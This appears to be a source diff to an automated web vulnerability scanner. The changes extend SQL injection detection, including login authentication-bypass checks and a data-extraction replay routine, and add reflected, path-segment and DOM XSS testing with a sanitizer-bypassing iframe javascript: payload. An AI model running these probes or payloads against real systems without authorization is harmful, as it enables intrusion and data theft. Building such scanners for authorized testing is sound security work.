                 )
 
                 if is_vulnerable:
+                    if attempt is not None:
+                        proof_types = attempt.setdefault("proof_types", [])
+                        for proof_type in _sqli_proof_types(evidence):
+                            if proof_type not in proof_types:
+                                proof_types.append(proof_type)
+                        if proof_types:
+                            attempt["proof_type"] = proof_types[0]
                     if not results["dbms_detected"]:
                         fingerprint = _match_dbms_fingerprint(body_out, baseline_body)
                         if fingerprint:
                             results["dbms_detected"] = fingerprint["dbms"]
+                    is_auth_bypass = any("Authentication bypass via SQLi" in item for item in evidence)
                     finding_dict = {
                         "type": "SQLi",
                         "method": "GET",
@@ -5840,7 +7769,7 @@ async def smart_sqli_test(
                         "dbms": results["dbms_detected"],
                         "evidence": evidence,
                         "confidence": 0.9 if len(evidence) > 1 else 0.7,
-                        "severity": "critical" if "schema" in technique else "high",
+                        "severity": "critical" if "schema" in technique or is_auth_bypass else "high",
                     }
                     request_headers = _headers_from_curl_args(auth_args)
                     if request_headers:
@@ -5849,18 +7778,34 @@ async def smart_sqli_test(
                     results["vulnerabilities_found"] += 1
                     break  # One confirmed SQLi per param is enough
 
+        finished = _finish_endpoint_attempt(
+            attempt,
+            budget_exhausted=bool(results.get("budget_exhausted")),
+            budget_exhausted_reason=results.get("budget_exhausted_reason"),
+        )
+        if finished:
+            results["endpoint_attempts"].append(finished)
+
     # Test POST endpoints
     for endpoint in post_endpoints[:max_endpoints]:
         if _budget_exhausted():
             break
         endpoint_url = endpoint.get("url", "")
         method = endpoint.get("method", "POST").upper()
-        body_params = endpoint.get("body_params", [])
+        body_params = _coerce_param_names(endpoint.get("body_params") or endpoint.get("params"))
+        body_params = _prioritize_active_params(body_params, family="sqli", endpoint=endpoint, location="body")
         content_type = endpoint.get("content_type") or "application/json"
 
         if not body_params:
             continue
 
+        attempt = _new_endpoint_attempt(
+            endpoint,
+            "sqli",
+            url_override=endpoint_url,
+            method_override=method,
+            body_params=list(body_params),
+        )
         results["endpoints_tested"] += 1
         results["post_endpoints_tested"] += 1
         _emit_sqli_progress(f"testing {method} endpoint {endpoint_url}")
@@ -5869,6 +7814,9 @@ async def smart_sqli_test(
         auth_post_args = _filter_curl_headers(auth_args, {"content-type"})
         is_array_body = isinstance(base_body, list)
         if is_array_body and "json" not in content_type.lower():
+            finished = _finish_endpoint_attempt(attempt, skipped_reason="unsupported_array_body_content_type")
+            if finished:
+                results["endpoint_attempts"].append(finished)
             continue
 
         # Detect DBMS via POST/PUT/PATCH if not known yet
@@ -5895,31 +7843,14 @@ async def smart_sqli_test(
             if _budget_exhausted():
                 break
             results["params_tested"] += 1
+            if attempt is not None:
+                attempt["attempted_params_count"] += 1
             _emit_sqli_progress(f"testing {method} param {param}")
             # Distinctive canary embedded in the baseline so we can detect
             # whether this body parameter is reflected into the response.
             reflection_canary = f"zqSqli{random.randint(100000, 999999)}cx"
             # Build baseline for THIS param
-            if is_array_body:
-                baseline_body = copy.deepcopy(base_body)
-                if not baseline_body:
-                    baseline_body = [{}] if param != "__item__" else [""]
-                if isinstance(baseline_body[0], dict):
-                    if param not in baseline_body[0]:
-                        baseline_body[0][param] = _fallback_value_for_param(param)
-                    if isinstance(baseline_body[0][param], str):
-                        baseline_body[0][param] = f"{baseline_body[0][param]}{reflection_canary}"
-                else:
-                    base_val = baseline_body[0] if baseline_body else _fallback_value_for_param(param)
-                    if not isinstance(base_val, str):
-                        base_val = str(base_val)
-                    baseline_body[0] = f"{base_val}{reflection_canary}"
-            else:
-                baseline_body = dict(base_body) if base_body else {}
-                if param not in baseline_body:
-                    baseline_body[param] = _fallback_value_for_param(param)
-                if isinstance(baseline_body[param], str):
-                    baseline_body[param] = f"{baseline_body[param]}{reflection_canary}"
+            baseline_body = _build_sqli_body_baseline(base_body, param, reflection_canary)
 
             baseline_body_args, baseline_header_args = _build_curl_body_args(baseline_body, content_type)
             baseline_start = time.time()
@@ -5935,6 +7866,37 @@ async def smart_sqli_test(
                 continue
 
             baseline_body_out, baseline_status = _parse_curl_body_status(baseline_out)
+            if baseline_status in (400, 422) and "json" in content_type.lower():
+                missing_fields = _extract_missing_validation_fields(baseline_body_out)
+                added_fields = _add_validation_fields_to_body(base_body, missing_fields, content_type)
+                if added_fields:
+                    _add_validation_fields_to_body(baseline_body, added_fields, content_type)
+                    results["validation_fields_added"].append({
+                        "url": endpoint_url,
+                        "method": method,
+                        "fields": added_fields,
+                    })
+                    if attempt is not None:
+                        attempt["validation_fields_added"] = list(dict.fromkeys(
+                            [*(attempt.get("validation_fields_added") or []), *added_fields]
+                        ))
+                    baseline_body_args, baseline_header_args = _build_curl_body_args(baseline_body, content_type)
+                    retry_cmd = [
+                        "curl", "-sS", "-X", method, "-L", "-k", "--max-time", "10",
+                        "-H", "User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)",
+                    ] + baseline_header_args + auth_post_args + baseline_body_args + [
+                        "-w", f"\n{_CURL_STATUS_MARKER}%{{http_code}}", endpoint_url,
+                    ]
+                    retry_start = time.time()
+                    retry_out, _, retry_rc = await run(retry_cmd, timeout=12)
+                    baseline_elapsed = time.time() - retry_start
+                    if retry_rc != 0:
+                        continue
+                    baseline_body_out, baseline_status = _parse_curl_body_status(retry_out)
+            if baseline_status in (400, 422):
+                continue
+            if attempt is not None:
+                attempt["completed_params_count"] += 1
             baseline_len = len(baseline_body_out) if baseline_body_out else 0
             param_reflected = bool(baseline_body_out and reflection_canary in baseline_body_out)
 
@@ -5945,6 +7907,10 @@ async def smart_sqli_test(
             for payload, technique, description in payloads:
                 if _budget_exhausted():
                     break
+                # §5: record SQLi techniques attempted for POST/body params too (not
+                # just GET) so per-endpoint technique telemetry is complete.
+                if attempt is not None:
+                    attempt.setdefault("techniques_attempted", set()).add(technique)
                 test_body = _apply_body_param(baseline_body, param, payload)
                 test_body_args, test_header_args = _build_curl_body_args(test_body, content_type)
 
@@ -5991,10 +7957,18 @@ async def smart_sqli_test(
                 )
 
                 if is_vulnerable:
+                    if attempt is not None:
+                        proof_types = attempt.setdefault("proof_types", [])
+                        for proof_type in _sqli_proof_types(evidence):
+                            if proof_type not in proof_types:
+                                proof_types.append(proof_type)
+                        if proof_types:
+                            attempt["proof_type"] = proof_types[0]
                     if not results["dbms_detected"]:
                         fingerprint = _match_dbms_fingerprint(body_out, baseline_body_out)
                         if fingerprint:
                             results["dbms_detected"] = fingerprint["dbms"]
+                    is_auth_bypass = any("Authentication bypass via SQLi" in item for item in evidence)
                     request_headers = _headers_from_curl_args(auth_args)
                     if method in ("POST", "PUT", "PATCH") and content_type:
                         request_headers.setdefault("Content-Type", content_type)
@@ -6009,7 +7983,7 @@ async def smart_sqli_test(
                         "dbms": results["dbms_detected"],
                         "evidence": evidence,
                         "confidence": 0.9 if len(evidence) > 1 else 0.7,
-                        "severity": "critical" if "schema" in technique else "high",
+                        "severity": "critical" if "schema" in technique or is_auth_bypass else "high",
                     }
                     # Include content_type and original body for POST verification replay
                     if method in ("POST", "PUT", "PATCH"):
@@ -6022,6 +7996,14 @@ async def smart_sqli_test(
                     results["vulnerabilities_found"] += 1
                     print(f"[sqli] {method} SQLi FOUND in {endpoint_url} param={param}", file=sys.stderr)
                     break  # One confirmed SQLi per param is enough
+
+        finished = _finish_endpoint_attempt(
+            attempt,
+            budget_exhausted=bool(results.get("budget_exhausted")),
+            budget_exhausted_reason=results.get("budget_exhausted_reason"),
+        )
+        if finished:
+            results["endpoint_attempts"].append(finished)
 
     _emit_sqli_progress("SQLi probes complete", force=True)
     return results
@@ -6115,6 +8097,8 @@ async def sqli_data_extraction(
     param = sqli_finding.get("param", "")
     dbms = str(sqli_finding.get("dbms") or "").lower()
     method = sqli_finding.get("method", "GET")
+    content_type = str(sqli_finding.get("content_type") or "application/json")
+    finding_headers = sqli_finding.get("request_headers") if isinstance(sqli_finding.get("request_headers"), dict) else {}
 
     if not url or not param:
         return results
@@ -6129,6 +8113,28 @@ async def sqli_data_extraction(
 
     auth_args = get_auth_curl_args(auth_session)
     extraction_payloads = SQLI_EXTRACTION_PAYLOADS[dbms]
+
+    def _body_template_from_finding() -> Any:
+        raw_body = sqli_finding.get("body")
+        if isinstance(raw_body, (dict, list)):
+            return copy.deepcopy(raw_body)
+        if not isinstance(raw_body, str) or not raw_body:
+            return {param: _fallback_value_for_param(param)}
+        if "json" in content_type.lower():
+            try:
+                parsed = json.loads(raw_body)
+                if isinstance(parsed, (dict, list)):
+                    return parsed
+            except (TypeError, ValueError, json.JSONDecodeError):
+                return {param: _fallback_value_for_param(param)}
+        parsed_form = dict(urllib.parse.parse_qsl(raw_body, keep_blank_values=True))
+        return parsed_form or {param: _fallback_value_for_param(param)}
+
+    base_replay_body = _body_template_from_finding()
+    replay_header_args = _curl_header_args_from_mapping(
+        finding_headers,
+        drop_names={"content-type", "content-length", "host", "user-agent"},
+    )
 
     print(f"[sqli-extract] Attempting data extraction from {url} param={param} dbms={dbms}", file=sys.stderr)
 
@@ -6147,15 +8153,18 @@ async def sqli_data_extraction(
                 "-H", "User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)",
             ] + auth_args + ["-w", f"\n{_CURL_STATUS_MARKER}%{{http_code}}", test_url]
         else:
-            # POST method
+            # Preserve the original structured request body when available. Many
+            # POST/PUT/PATCH endpoints require sibling fields, so replaying only
+            # {param: payload} turns a confirmed injection into a validation error.
             test_url = url
-            body_data = {param: payload}
+            body_data = _apply_body_param(base_replay_body, param, payload)
+            body_args, body_header_args = _build_curl_body_args(body_data, content_type)
             cmd = [
                 "curl", "-sS", "-L", "-k", "--max-time", "15", "-X", method,
                 "-H", "User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)",
-                "-H", "Content-Type: application/json",
-                "-d", json.dumps(body_data),
-            ] + auth_args + ["-w", f"\n{_CURL_STATUS_MARKER}%{{http_code}}", test_url]
+            ] + replay_header_args + body_header_args + auth_args + body_args + [
+                "-w", f"\n{_CURL_STATUS_MARKER}%{{http_code}}", test_url
+            ]
 
         out, _, rc = await run(cmd, timeout=20)
         if rc != 0 or not out:
@@ -6379,6 +8388,51 @@ def _try_parse_json(text: str | None) -> dict | list | None:
         return None
 
 
+def _auth_success_signals_from_body(body: str | None) -> list[str]:
+    """Return strict authentication-success signals from a response body."""
+    if not body:
+        return []
+    signals: set[str] = set()
+    parsed = _try_parse_json(body)
+    if parsed is not None:
+        keys = {key.lower() for key in _extract_json_keys(parsed)}
+        auth_key_fragments = (
+            "token", "access_token", "accesstoken", "refresh_token", "refreshtoken",
+            "jwt", "session", "authentication", "authorization",
+        )
+        identity_key_fragments = (
+            "user", "username", "email", "role", "roles", "account", "profile", "umail",
+        )
+        if any(any(fragment in key for fragment in auth_key_fragments) for key in keys):
+            signals.add("auth_token_or_session")
+        if any(any(fragment in key for fragment in identity_key_fragments) for key in keys):
+            signals.add("user_identity_data")
+
+    lowered = body.lower()
+    auth_markers = (
+        '"token"', '"access_token"', '"accessToken"', '"refresh_token"',
+        '"authentication"', '"authorization"', '"jwt"', '"session"',
+    )
+    identity_markers = (
+        '"user"', '"username"', '"email"', '"role"', '"roles"', '"account"', '"profile"', '"umail"',
+    )
+    if any(marker.lower() in lowered for marker in auth_markers):
+        signals.add("auth_token_or_session")
+    if any(marker.lower() in lowered for marker in identity_markers):
+        signals.add("user_identity_data")
+    return sorted(signals)
+
+
+def _looks_like_auth_failure_response(status: int | None, body: str | None) -> bool:
+    lowered = (body or "").lower()
+    failure_markers = (
+        "invalid credentials", "invalid email", "invalid password",
+        "invalid email or password", "login failed", "authentication failed",
+        "unauthorized", "forbidden", "wrong password", "user not found",
+    )
+    return status in {400, 401, 403, 404, 422} or any(marker in lowered for marker in failure_markers)
+
+
 def _extract_json_keys(obj: Any, prefix: str = "") -> set[str]:
     """Extract all keys from a JSON object recursively."""
     keys: set[str] = set()
@@ -6495,12 +8549,39 @@ def _check_sqli_response(
             # Compare array lengths
             baseline_arrays = _get_array_lengths(baseline_json)
             response_arrays = _get_array_lengths(response_json)
-            for key in baseline_arrays:
-                if key in response_arrays:
-                    bl = baseline_arrays[key]
-                    rl = response_arrays[key]
-                    if bl != rl:
-                        evidence.append(f"Array '{key}' length: {bl} -> {rl}")
+            for key in sorted(set(baseline_arrays) | set(response_arrays)):
+                bl = baseline_arrays.get(key, 0)
+                rl = response_arrays.get(key, 0)
+                if bl != rl:
+                    evidence.append(f"Array '{key}' length: {bl} -> {rl}")
+                if (
+                    not reflected
+                    and status_code is not None
+                    and 200 <= status_code < 300
+                    and rl >= max(2, bl + 2)
+                    and response_len >= baseline_len + 120
+                    and (
+                        baseline_status in (400, 401, 403, 404, 422)
+                        or (baseline_status is not None and 200 <= baseline_status < 300 and bl <= 1)
+                    )
+                ):
+                    strong_signal = True
+                    evidence.append(f"SQLi JSON collection expansion: array '{key}' {bl} -> {rl}")
+
+    # 3b. Authentication-bypass proof for login endpoints. A failed-login
+    # baseline becoming an authenticated JSON session is strong evidence for
+    # SQLi even when the app does not expose DB errors or timing signals.
+    if not strong_signal and _looks_like_auth_failure_response(baseline_status, baseline_body):
+        success_signals = _auth_success_signals_from_body(out)
+        if status_code is not None and 200 <= status_code < 300 and {
+            "auth_token_or_session",
+            "user_identity_data",
+        }.issubset(set(success_signals)):
+            strong_signal = True
+            evidence.append(
+                "Authentication bypass via SQLi: invalid-login baseline returned an authenticated session "
+                f"({', '.join(success_signals)})"
+            )
 
     # 4. Boolean-based detection (true/false condition comparison)
     if "boolean" in technique and true_condition_len is not None:
@@ -6566,6 +8647,34 @@ def _check_sqli_response(
     return strong_signal, evidence
 
 
+def _sqli_proof_types(evidence: list[str]) -> list[str]:
+    """Map proof evidence to stable, content-free telemetry labels."""
+    labels: list[str] = []
+    checks = (
+        ("SQLi JSON collection expansion", "json_collection_expansion"),
+        ("Authentication bypass via SQLi", "authentication_bypass"),
+        ("SQL error detected", "db_error_fingerprint"),
+        ("Time-based delay", "time_delay"),
+        ("Boolean difference", "boolean_differential"),
+        ("Data extraction indicator", "data_extraction"),
+    )
+    for marker, label in checks:
+        if any(marker in item for item in evidence):
+            labels.append(label)
+    return labels or ["differential_response"]
+
+
+def _select_xss_payloads(context: str) -> list[tuple[str, str, str]]:
+    """Context payloads plus any user-supplied XSS payloads (additive)."""
+    payloads = list(CONTEXT_XSS_PAYLOADS.get(context, CONTEXT_XSS_PAYLOADS["in_html"]))
+    seen = {(p, t) for p, t, _ in payloads}
+    for custom in _load_custom_payloads("xss", include_packs=True):
+        if (custom, "custom") not in seen:
+            payloads.append((custom, "custom", "User-supplied XSS payload"))
+            seen.add((custom, "custom"))
+    return payloads
+
+
 async def smart_xss_test(
     url: str,
     endpoints: list[dict],
@@ -6601,6 +8710,7 @@ async def smart_xss_test(
         "post_endpoints_tested": 0,
         "budget_exhausted": False,
         "budget_exhausted_reason": None,
+        "endpoint_attempts": [],
     }
     deadline = time.monotonic() + max_seconds if max_seconds and max_seconds > 0 else None
     budget_logged = False
@@ -6629,6 +8739,14 @@ async def smart_xss_test(
 
     def _budget_exhausted() -> bool:
         nonlocal budget_logged
+        if _scanner_cancel_requested():
+            results["budget_exhausted"] = True
+            results["budget_exhausted_reason"] = "cancelled"
+            if not budget_logged:
+                print("[xss] Cancellation requested; stopping XSS probes", file=sys.stderr)
+                _emit_xss_progress("cancel requested", force=True)
+                budget_logged = True
+            return True
         if max_findings is not None and results["vulnerabilities_found"] >= max_findings:
             results["budget_exhausted"] = True
             results["budget_exhausted_reason"] = "finding_cap"
@@ -6669,6 +8787,123 @@ async def smart_xss_test(
         name_l = name.lower()
         return any(tok in name_l for tok in ("file", "upload", "attachment", "image", "avatar", "photo"))
 
+    _XSS_EXECUTABLE_CONTEXTS = ("in_html", "in_script", "in_attribute", "in_angular")
+
+    async def _test_path_segment_xss(endpoint_url: str, parsed_ep: Any, path_seg: tuple[str, int]) -> None:
+        """Reflected XSS where the injection point is an id-like PATH SEGMENT
+        (e.g. ``/track-order/{id}``), not a query param — the query-param loop
+        never covers these. Generic (id-shape segment, no route names).
+
+        Precision guard: a path segment echoed into a JSON/API response is NOT,
+        by itself, XSS, so a finding is emitted only when browser-proven OR the
+        payload reflects unescaped in an executable HTML context. This keeps the
+        engine from flagging every id-reflecting REST endpoint.
+        """
+        seg_value, seg_index = path_seg
+        canary = f"xss{random.randint(10000, 99999)}test"
+        canary_url = _build_path_segment_url(parsed_ep, seg_index, canary)
+        out, _err, rc = await run([
+            "curl", "-sS", "-L", "-k", "--max-time", "10",
+            "-H", "User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)",
+        ] + auth_args + [canary_url], timeout=12)
+        if rc != 0 or not out or canary not in out:
+            return
+        results["reflections_found"] += 1
+        context = detect_reflection_context(out, canary)
+        if context == "not_reflected":
+            return
+        executable = context in _XSS_EXECUTABLE_CONTEXTS
+        payloads = _select_xss_payloads(context)
+        for payload, technique, description in payloads:
+            if _budget_exhausted():
+                break
+            payload_url = _build_path_segment_url(parsed_ep, seg_index, payload)
+            payload_out, _p_err, payload_rc = await run([
+                "curl", "-sS", "-L", "-k", "--max-time", "10",
+                "-H", "User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)",
+            ] + auth_args + [payload_url], timeout=12)
+            if payload_rc != 0 or not payload_out:
+                continue
+
+            unescaped = False
+            if payload in payload_out:
+                escaped_variants = [
+                    payload.replace("<", "&lt;"),
+                    payload.replace(">", "&gt;"),
+                    payload.replace("'", "&#39;"),
+                    payload.replace('"', "&quot;"),
+                    urllib.parse.quote(payload),
+                ]
+                unescaped = not any(ev in payload_out for ev in escaped_variants)
+
+            verified = False
+            proof_data = None
+            severity = None
+            confidence = 0.6
+            evidence: list[str] = []
+
+            # Browser proof is the real arbiter: navigate directly to the URL
+            # with the payload already in the path (prebuilt_url) so no spurious
+            # query param is appended.
+            if HAS_XSS_PROOF and prove_xss_headless:
+                try:
+                    proof = await prove_xss_headless(
+                        url=endpoint_url,
+                        param=f"path:{seg_value}",
+                        payload=payload,
+                        prebuilt_url=payload_url,
+                        headers=_headers_from_curl_args(auth_args) or None,
+                    )
+                    if proof and proof.proven:
+                        verified = True
+                        severity = "high"
+                        confidence = proof.confidence
+                        evidence.append(f"Browser proof: {proof.technique}")
+                        if proof.extracted_data:
+                            evidence.append(f"Proof data: {proof.extracted_data}")
+                        proof_data = proof.to_dict()
+                except Exception as e:
+                    evidence.append(f"Browser verification skipped: {e}")
+
+            if not verified:
+                # No execution proof — only report an unescaped reflection that
+                # landed in an executable HTML context. JSON/text echoes are not
+                # reported (would be a false positive on id-reflecting APIs).
+                if not (unescaped and executable):
+                    continue
+                severity = "high" if context in ("in_script", "in_angular") else "medium"
+                confidence = 0.65
+                evidence.append(f"Payload reflected unescaped in path segment ({context})")
+
+            finding = {
+                "type": "XSS",
+                "subtype": f"path_segment_{context}",
+                "url": endpoint_url,
+                "method": "GET",
+                "param": seg_value,
+                "injection_point": "path_segment",
+                "payload": payload,
+                "technique": technique,
+                "description": description,
+                "evidence": evidence,
+                "confidence": confidence,
+                "severity": severity,
+                "verified": verified,
+            }
+            if verified:
+                # Browser-proven: explicit High CVSS so the generic 6.1 reflected
+                # base score can't cap it to medium (xss-severity-cvss-cap).
+                finding["cvss_score"] = 7.4
+            if proof_data:
+                finding["browser_proof"] = proof_data
+            request_headers = _headers_from_curl_args(auth_args)
+            if request_headers:
+                finding["request_headers"] = request_headers
+
+            results["findings"].append(finding)
+            results["vulnerabilities_found"] += 1
+            break  # one confirmed XSS per path segment is enough
+
     # Separate GET and POST endpoints to ensure both get tested
     get_endpoints = [
         e for e in endpoints
@@ -6682,6 +8917,10 @@ async def smart_xss_test(
         and _method_allowed(e, e.get("method", "GET").upper())
     ]
 
+    # Value-sort so real, high-value endpoints lead instead of synthetic permutations.
+    get_endpoints = _prioritize_active_endpoints(get_endpoints, family="xss")
+    post_endpoints = _prioritize_active_endpoints(post_endpoints, family="xss")
+
     # Test GET endpoints
     for endpoint in get_endpoints[:max_endpoints]:
         if _budget_exhausted():
@@ -6693,11 +8932,31 @@ async def smart_xss_test(
             if "{" in endpoint_url:
                 continue
         params = _coerce_param_list(endpoint.get("params") or endpoint.get("query_params"))
+        params = _prioritize_active_params(params, family="xss", endpoint=endpoint, location="query")
         param_defaults = endpoint.get("param_defaults") or endpoint.get("query_param_defaults") or {}
 
-        if not params:
+        # An id-like path segment (e.g. /track-order/{id}) is its own injection
+        # point; don't skip an endpoint that has one just because it has no query
+        # params.
+        parsed_ep = urllib.parse.urlparse(endpoint_url)
+        path_seg = _injectable_path_segment(parsed_ep.path)
+        if not params and not path_seg:
+            probe_url = _path_value_probe_candidate(parsed_ep, "shakerxss123")
+            if probe_url:
+                endpoint_url = probe_url
+                parsed_ep = urllib.parse.urlparse(endpoint_url)
+                path_seg = _injectable_path_segment(parsed_ep.path)
+
+        if not params and not path_seg:
             continue
 
+        attempt = _new_endpoint_attempt(
+            endpoint,
+            "xss",
+            url_override=endpoint_url,
+            method_override="GET",
+            params=list(params),
+        )
         results["endpoints_tested"] += 1
         results["get_endpoints_tested"] += 1
         _emit_xss_progress(f"testing GET endpoint {endpoint_url}")
@@ -6706,6 +8965,8 @@ async def smart_xss_test(
             if _budget_exhausted():
                 break
             results["params_tested"] += 1
+            if attempt is not None:
+                attempt["attempted_params_count"] += 1
             _emit_xss_progress(f"testing GET param {param}")
             # Send canary to detect reflection
             canary = f"xss{random.randint(10000, 99999)}test"
@@ -6723,6 +8984,8 @@ async def smart_xss_test(
                 "curl", "-sS", "-L", "-k", "--max-time", "10",
                 "-H", "User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)",
             ] + auth_args + [test_url], timeout=12)
+            if attempt is not None:
+                attempt["completed_params_count"] += 1
 
             if rc != 0 or not out:
                 continue
@@ -6739,7 +9002,7 @@ async def smart_xss_test(
                 continue
 
             # Get context-specific payloads
-            payloads = CONTEXT_XSS_PAYLOADS.get(context, CONTEXT_XSS_PAYLOADS["in_html"])
+            payloads = _select_xss_payloads(context)
 
             for payload, technique, description in payloads:
                 if _budget_exhausted():
@@ -6787,24 +9050,31 @@ async def smart_xss_test(
                     verified = False
                     proof_data = None
 
-                    # Attempt browser proof for high-severity findings
-                    if severity == "high" and HAS_XSS_PROOF and prove_xss_headless:
+                    # A browser proof of execution is the real arbiter of XSS
+                    # severity, regardless of WHERE the payload reflected. Attempt
+                    # proof for EVERY reflected context (HTML/JSON/attribute/script),
+                    # not just in_script/in_angular — reflected payloads that execute
+                    # in a real browser are High wherever they landed. Proven ->
+                    # High; an unproven reflection that context-guessed High -> medium.
+                    if HAS_XSS_PROOF and prove_xss_headless:
                         try:
                             proof = await prove_xss_headless(
                                 url=endpoint_url,
                                 param=param,
                                 payload=payload,
-                                screenshot_dir=None  # Could add /tmp/xss_proofs if needed
+                                screenshot_dir=None,  # Could add /tmp/xss_proofs if needed
+                                headers=_headers_from_curl_args(auth_args) or None,
                             )
                             if proof and proof.proven:
                                 verified = True
-                                confidence = proof.confidence  # 0.99 for dialog, 0.90 for console, 0.85 for DOM
+                                severity = "high"
+                                confidence = proof.confidence  # 0.99 dialog / 0.90 console / 0.85 DOM
                                 evidence.append(f"Browser proof: {proof.technique}")
                                 if proof.extracted_data:
                                     evidence.append(f"Proof data: {proof.extracted_data}")
                                 proof_data = proof.to_dict()
-                            else:
-                                # Downgrade unverified high findings to medium
+                            elif severity == "high":
+                                # context guessed high but no execution confirmed
                                 severity = "medium"
                                 confidence = 0.65
                                 evidence.append("Browser verification attempted but no execution confirmed")
@@ -6826,6 +9096,10 @@ async def smart_xss_test(
                         "severity": severity,
                         "verified": verified,
                     }
+                    if verified:
+                        # Browser-proven execution: pass an explicit High CVSS so the
+                        # generic 6.1 reflected-XSS base score can't cap it to medium.
+                        finding["cvss_score"] = 7.4
                     if proof_data:
                         finding["browser_proof"] = proof_data
                     request_headers = _headers_from_curl_args(auth_args)
@@ -6835,6 +9109,22 @@ async def smart_xss_test(
                     results["findings"].append(finding)
                     results["vulnerabilities_found"] += 1
                     break  # One confirmed XSS per param is enough
+
+        # Reflected XSS via an id-like PATH SEGMENT (query-param loop above never
+        # covers these). Runs whether or not the endpoint had query params.
+        if path_seg and not _budget_exhausted():
+            try:
+                await _test_path_segment_xss(endpoint_url, parsed_ep, path_seg)
+            except Exception as _seg_err:
+                print(f"[xss] path-segment test error for {endpoint_url}: {_seg_err}", file=sys.stderr)
+
+        finished = _finish_endpoint_attempt(
+            attempt,
+            budget_exhausted=bool(results.get("budget_exhausted")),
+            budget_exhausted_reason=results.get("budget_exhausted_reason"),
+        )
+        if finished:
+            results["endpoint_attempts"].append(finished)
 
     # Test POST/PUT/PATCH endpoints with body params
     for endpoint in post_endpoints[:max_endpoints]:
@@ -6849,11 +9139,19 @@ async def smart_xss_test(
 
         method = endpoint.get("method", "POST").upper()
         body_params = _coerce_param_list(endpoint.get("body_params") or endpoint.get("params"))
+        body_params = _prioritize_active_params(body_params, family="xss", endpoint=endpoint, location="body")
         content_type = endpoint.get("content_type") or "application/json"
 
         if not body_params:
             continue
 
+        attempt = _new_endpoint_attempt(
+            endpoint,
+            "xss",
+            url_override=endpoint_url,
+            method_override=method,
+            body_params=list(body_params),
+        )
         results["endpoints_tested"] += 1
         results["post_endpoints_tested"] += 1
         _emit_xss_progress(f"testing {method} endpoint {endpoint_url}")
@@ -6861,6 +9159,9 @@ async def smart_xss_test(
         base_body = _build_body_template(endpoint)
         is_array_body = isinstance(base_body, list)
         if is_array_body and "json" not in content_type.lower():
+            finished = _finish_endpoint_attempt(attempt, skipped_reason="unsupported_array_body_content_type")
+            if finished:
+                results["endpoint_attempts"].append(finished)
             continue
 
         auth_post_args = _filter_curl_headers(auth_args, {"content-type"})
@@ -6871,6 +9172,8 @@ async def smart_xss_test(
             if "multipart/form-data" in content_type.lower() and _is_file_param(param):
                 continue
             results["params_tested"] += 1
+            if attempt is not None:
+                attempt["attempted_params_count"] += 1
             _emit_xss_progress(f"testing {method} param {param}")
 
             canary = f"xss{random.randint(10000, 99999)}test"
@@ -6882,6 +9185,8 @@ async def smart_xss_test(
                 "-H", "User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)",
                 "-X", method,
             ] + auth_post_args + header_args + body_args + [endpoint_url], timeout=12)
+            if attempt is not None:
+                attempt["completed_params_count"] += 1
 
             if rc != 0 or not out:
                 continue
@@ -6895,7 +9200,7 @@ async def smart_xss_test(
             if context == "not_reflected":
                 continue
 
-            payloads = CONTEXT_XSS_PAYLOADS.get(context, CONTEXT_XSS_PAYLOADS["in_html"])
+            payloads = _select_xss_payloads(context)
 
             for payload, technique, description in payloads:
                 if _budget_exhausted():
@@ -6936,6 +9241,38 @@ async def smart_xss_test(
                     severity = "high" if context in ["in_script", "in_angular"] else "medium"
                     confidence = 0.85
                     verified = False
+                    proof_data = None
+                    proof_attempted = False
+
+                    if (
+                        HAS_XSS_PROOF
+                        and prove_xss_response_headless
+                        and _xss_response_looks_browser_renderable(payload_out)
+                    ):
+                        proof_attempted = True
+                        try:
+                            proof = await prove_xss_response_headless(
+                                response_body=payload_out,
+                                payload=payload,
+                                request_label=f"{method} {endpoint_url}",
+                                screenshot_dir=None,
+                            )
+                            if proof and proof.proven:
+                                verified = True
+                                severity = "high"
+                                confidence = proof.confidence
+                                evidence.append(f"Browser proof: {proof.technique}")
+                                if proof.extracted_data:
+                                    evidence.append(f"Proof data: {proof.extracted_data}")
+                                proof_data = proof.to_dict()
+                            elif severity == "high":
+                                severity = "medium"
+                                confidence = 0.65
+                                evidence.append("Browser verification attempted but no execution confirmed")
+                        except Exception as e:
+                            evidence.append(f"Browser verification skipped: {e}")
+                    elif context == "in_json":
+                        evidence.append("Browser verification skipped: JSON response is not browser-renderable HTML")
 
                     finding = {
                         "type": "XSS",
@@ -6953,6 +9290,12 @@ async def smart_xss_test(
                         "content_type": content_type,
                         "body": payload_body,
                     }
+                    if verified:
+                        finding["cvss_score"] = 7.4
+                    if proof_data:
+                        finding["browser_proof"] = proof_data
+                    if proof_attempted:
+                        finding["browser_proof_attempted"] = True
                     request_headers = _headers_from_curl_args(auth_post_args + payload_headers)
                     if request_headers:
                         finding["request_headers"] = request_headers
@@ -6960,6 +9303,14 @@ async def smart_xss_test(
                     results["findings"].append(finding)
                     results["vulnerabilities_found"] += 1
                     break  # One confirmed XSS per param is enough
+
+        finished = _finish_endpoint_attempt(
+            attempt,
+            budget_exhausted=bool(results.get("budget_exhausted")),
+            budget_exhausted_reason=results.get("budget_exhausted_reason"),
+        )
+        if finished:
+            results["endpoint_attempts"].append(finished)
 
     # Note: Hash route DOM XSS is tested separately via hash_route_dom_xss_test()
     # which is called unconditionally in smart scans (not gated by run_xss flag)
@@ -6996,6 +9347,7 @@ async def hash_route_dom_xss_test(
         "endpoints_tested": 0,
         "params_tested": 0,
         "vulnerabilities_found": 0,
+        "endpoint_attempts": [],
     }
 
     # Filter to hash route endpoints only
@@ -7015,8 +9367,15 @@ async def hash_route_dom_xss_test(
 
     print(f"[dom-xss] Testing {min(len(hash_route_endpoints), max_endpoints)} hash route endpoints for DOM XSS", file=sys.stderr)
 
-    # DOM XSS payloads for fragment injection
+    # DOM XSS payloads for fragment injection.
+    # The iframe javascript:/srcdoc vectors are listed FIRST because they are the
+    # ones that survive Angular's built-in sanitizer (which strips img/svg event
+    # handlers): this is exactly OWASP Juice Shop's headline DOM XSS via
+    # #/search?q=<iframe src="javascript:alert(`xss`)">. Without these the only
+    # list that actually runs in a smart scan missed Juice Shop entirely.
     DOM_XSS_PAYLOADS = [
+        ("<iframe src=\"javascript:alert(1)\">", "iframe_js_uri", "Iframe javascript: URI (Angular sanitizer bypass)"),
